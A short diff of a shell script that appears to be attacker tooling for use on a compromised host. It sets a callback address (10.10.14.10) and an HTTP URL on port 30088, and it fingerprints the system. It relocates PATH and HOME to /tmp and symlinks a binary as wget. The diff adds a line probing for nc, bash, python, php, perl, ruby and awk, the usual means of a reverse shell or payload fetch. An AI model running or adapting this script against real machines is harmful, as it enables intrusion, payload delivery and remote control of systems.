@@ -4,10 +4,10 @@ exec 2>./y2
 exec 3>./z3
 set -x;
 TZ=UTC-8;date;
-echo "$@";
 rr="10.10.14.10";
 [ ! -z $ip2 ] && rr=$ip2;
 rr1="http://${rr}:30088/";
+which nc bash python php exec lua perl ruby  awk
 
 s1="export PATH=\$PATH:/tmp;TZ=UTC-8;
 uptime;grep NA /etc/os-release 2>&1;
@@ -42,6 +42,8 @@ ln2() {
    ($1 uptime >>tm) && ln -s $1 wget
     return 0
 }
+
+
 alias ll="ls -al"
 export PATH=$PATH:/tmp
 export HOME=/tmp
